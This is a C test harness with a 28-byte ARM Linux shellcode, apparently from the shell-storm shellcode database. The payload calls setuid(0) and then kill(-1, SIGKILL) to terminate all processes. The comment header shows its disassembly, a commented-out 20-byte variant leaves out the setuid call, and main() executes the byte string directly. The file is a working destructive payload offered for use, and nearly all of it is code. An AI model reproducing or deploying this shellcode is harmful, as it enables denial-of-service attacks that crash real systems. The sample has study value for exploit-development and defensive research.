/*
Title:  Linux/ARM - setuid(0) & kill(-1, SIGKILL) - 28 bytes
	(Kill all processes)

Date:   2010-06-29
Tested: ARM926EJ-S rev 5 (v5l)

Author: Jonathan Salwan
Web:    http://shell-storm.org | http://twitter.com/jonathansalwan

! Dtabase of shellcodes http://www.shell-storm.org/shellcode/


    8054:	e28f3001 	add	r3, pc, #1   ; 0x1
    8058:	e12fff13 	bx	r3
    805c:	1b24      	subs	r4, r4, r4
    805e:	1c20      	adds	r0, r4, #0
    8060:	2717      	movs	r7, #23
    8062:	df01      	svc	1
    8064:	1a92      	subs	r2, r2, r2
    8066:	1c10      	adds	r0, r2, #0
    8068:	3801      	subs	r0, #1
    806a:	2109      	movs	r1, #9
    806c:	2725      	movs	r7, #37
    806e:	df01      	svc	1

*/

#include <stdio.h>


/* kill all processes without setuid(0) - 20 bytes */

// char *SC = "\x01\x30\x8f\xe2"
//            "\x13\xff\x2f\xe1"
//            "\x92\x1a\x10\x1c"
//            "\x01\x38\x09\x21"
//            "\x25\x27\x01\xdf";


/* kill all processes with setuid(0) - 28 byes */

char *SC = "\x01\x30\x8f\xe2"
           "\x13\xff\x2f\xe1"
           "\x24\x1b\x20\x1c"
           "\x17\x27\x01\xdf"
           "\x92\x1a\x10\x1c"
           "\x01\x38\x09\x21"
           "\x25\x27\x01\xdf";


int main(void)
{
        fprintf(stdout,"Length: %d\n",strlen(SC));
        (*(void(*)()) SC)();
return 0;
}